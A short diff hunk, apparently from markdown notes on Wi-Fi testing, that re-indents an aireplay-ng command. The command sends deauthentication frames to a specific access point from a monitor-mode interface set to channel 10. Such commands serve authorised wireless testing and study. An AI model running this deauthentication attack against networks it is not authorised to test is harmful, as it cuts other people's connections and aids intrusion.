@@ -11,6 +11,6 @@ sudo iwconfig wlp0s20f3mon channel 10
 ~~~
 
 ~~~ruby
-sudo aireplay-ng --deauth 50 -a E4:C3:2A:65:F9:7E wlp0s20f3mon
+	sudo aireplay-ng --deauth 50 -a E4:C3:2A:65:F9:7E wlp0s20f3mon
 ~~~
 
